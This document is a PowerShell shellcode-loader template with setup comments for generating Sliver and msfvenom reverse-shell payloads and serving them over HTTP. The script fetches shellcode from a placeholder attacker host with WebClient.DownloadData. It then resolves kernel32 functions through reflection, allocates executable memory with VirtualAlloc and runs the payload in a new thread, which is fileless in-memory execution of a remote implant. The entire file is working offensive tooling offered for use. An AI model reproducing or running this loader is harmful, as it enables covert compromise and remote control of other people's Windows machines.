# =============================================================================
# TEMPLATE — set $buf to your shellcode before running
#
# Full implant is multi-MB → download it at runtime (don't paste inline):
#   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
#   python3 -m http.server 80          # host /tmp/sc.bin
#
# Small shellcode (a stager) → paste the byte array inline instead:
#   msfvenom -p windows/x64/custom/reverse_winhttp LHOST=<IP> LPORT=<PORT> LURI=/hello.woff -f ps1
# =============================================================================

function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# Full implant (multi-MB): download at runtime
[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://<IP>/sc.bin')

# OR small shellcode (stager): paste the bytes inline
# [Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0

# Allocate exactly the shellcode size (Sliver shellcode is MBs — a fixed 0x1000 would fail)
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 'kernel32.dll' 'VirtualAlloc'), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$lpMem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.Length)


$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 'kernel32.dll' 'CreateThread'), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 'kernel32.dll' 'WaitForSingleObject'), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
